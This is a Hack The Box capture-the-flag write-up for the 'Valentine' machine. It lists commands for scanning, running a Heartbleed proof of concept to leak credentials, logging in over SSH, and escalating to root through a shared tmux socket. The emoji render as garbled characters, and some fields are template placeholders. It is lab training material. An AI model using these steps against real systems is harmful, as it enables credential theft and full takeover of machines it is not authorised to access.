# ğŸ’˜ Hack The Box - Valentine

**Machine Info**  
- OS: Linux  
- Difficulty: Easy  
- IP: `10.10.10.79`  
- Release Date: Legacy Box  
- Author: HTB  
- Write-up by: *Your Name*

---

## ğŸ•µï¸â€â™‚ï¸ Reconnaissance

### ğŸ” Nmap Scan

```bash
nmap -sC -sV -oA valentine 10.10.10.79



Result:

Port	Service	Version
22	SSH	OpenSSH 6.6.1p1
80	HTTP	Apache httpd 2.4.7
443	HTTPS	Apache httpd (SSL)



ğŸŒ Web Enumeration
ğŸ” Port 80 (HTTP)
Default Apache page.

Nothing useful via browser.

Ran Nikto:

nikto -h http://10.10.10.79
No critical vulnerabilities found.



ğŸ”’ Port 443 (HTTPS)
SSL certificate is self-signed.

Used sslscan:
sslscan 10.10.10.79
ğŸ’¥ Heartbleed Vulnerability Detected!




!

ğŸ’‰ Exploitation: Heartbleed (CVE-2014-0160)
Used Heartbleed PoC to dump memory:
python heartbleed.py 10.10.10.79
ğŸ¯ Found leaked credentials:

username: hype
password: <shdshdsdshhyjsdsjjd>



ssh hype@10.10.10.79
Or using key (if given):

ssh -i hype_key hype@10.10.10.79
âš ï¸ Error:

sign_and_send_pubkey: no mutual signature supported
âœ… Fix:
sudo ssh-keygen -p -f hype_key -m pem
Now login successful as hype.




ğŸ§  Post Exploitation
ğŸ” Enumeration as hype
Found something interesting in processes:


ps aux | grep tmux

/usr/bin/tmux -S /.devs/dev_sess
Checked sudo -l:


sudo -l
Got permission to run tmux:
User hype may run the following on valentine:
    (ALL : ALL) NOPASSWD: /usr/bin/tmux
ğŸš€ Privilege Escalation
Used the tmux socket:


sudo /usr/bin/tmux -S /.devs/dev_sess





ğŸ¯ Flags

cat /home/hype/user.txt
cat /root/root.txt
ğŸ§° Tools Used
Nmap

Nikto

Heartbleed PoC (Python)

SSLScan

Tmux

SSH / SSH-Keygen






ğŸ§  Takeaways
Heartbleed is a real and dangerous bug that can leak memory.

Proper SSH key format is important (PEM vs newer formats).

Misconfigured tmux can lead to privilege escalation if socket is accessible.


